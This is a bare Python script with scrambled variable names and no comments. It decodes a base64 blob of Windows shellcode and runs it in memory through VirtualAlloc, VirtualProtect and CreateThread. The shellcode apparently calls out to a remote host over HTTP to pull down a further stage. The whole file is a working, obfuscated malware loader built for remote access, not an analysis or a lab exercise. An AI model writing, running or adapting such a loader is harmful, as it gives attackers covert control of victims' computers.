import ctypes as hGYWbB
import base64
kAioXRQfr = base64.b64decode("/OiGAAAAYInlMdJki1Iwi1IMi1IUi3IoD7dKJjH/McCsPGF8Aiwgwc8NAcfi8FJXi1IQi0I8i0wQeONKAdFRi1kgAdOLSRjjPEmLNIsB1jH/McCswc8NAcc44HX0A334O30kdeJYi1gkAdNmiwxLi1gcAdOLBIsB0IlEJCRbW2FZWlH/4FhfWosS64ldaG5ldABod2luaVRoTHcmB//VMdtTU1NTU2g6Vnmn/9VTU2oDU1NoXBEAAOs6UGhXiZ/G/9VTaAACYIRTU1PrKVNQaOtVLjv/1ZZqEF9TU1NTVmgtBhh7/9WFwHUYT3XtaPC1olb/1etC6NL///8vOWpsTQAAakBoABAAAGgAAEAAU2hYpFPl/9WTU1OJ51doACAAAFNWaBKWieL/1YXAdL+LBwHDhcB15VjD6H3///84LjguOC44AA==")
GuvGEFeAvjS = hGYWbB.windll.kernel32.VirtualAlloc(hGYWbB.c_int(0),hGYWbB.c_int(len(kAioXRQfr)),hGYWbB.c_int(0x3000),hGYWbB.c_int(0x04))
hGYWbB.windll.kernel32.RtlMoveMemory(hGYWbB.c_int(GuvGEFeAvjS),kAioXRQfr,hGYWbB.c_int(len(kAioXRQfr)))
qAUrfGeI = hGYWbB.windll.kernel32.VirtualProtect(hGYWbB.c_int(GuvGEFeAvjS),hGYWbB.c_int(len(kAioXRQfr)),hGYWbB.c_int(0x20),hGYWbB.byref(hGYWbB.c_uint32(0)))
KBMMxqz = hGYWbB.windll.kernel32.CreateThread(hGYWbB.c_int(0),hGYWbB.c_int(0),hGYWbB.c_int(GuvGEFeAvjS),hGYWbB.c_int(0),hGYWbB.c_int(0),hGYWbB.pointer(hGYWbB.c_int(0)))
hGYWbB.windll.kernel32.WaitForSingleObject(hGYWbB.c_int(KBMMxqz),hGYWbB.c_int(-1))